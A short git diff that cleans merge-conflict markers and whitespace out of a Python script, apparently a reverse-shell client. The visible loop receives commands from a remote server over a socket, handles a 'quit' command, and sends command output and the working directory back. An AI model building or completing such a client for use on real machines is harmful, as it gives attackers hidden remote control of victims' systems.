@@ -22,20 +22,6 @@ s.send(cwd.encode())
 while True:
 
 
-
-<<<<<<< HEAD
-    # receive the command from the server
-=======
-
-
-
-
-
-
-
-
-    '''#gets the command from the server
->>>>>>> 4bfd87d4ad7befb4aa07655e101a86a9a5e8e512
     command = s.recv(BUFFER_SIZE).decode()
     splited_command = command.split()
     if command.lower() == "quit":
@@ -59,6 +45,6 @@ while True:
     # send the results back to the server
     message = f"{output}{SEPARATOR}{pwd}"
     s.send(message.encode())
-    
+
 # close client connection
 s.close()
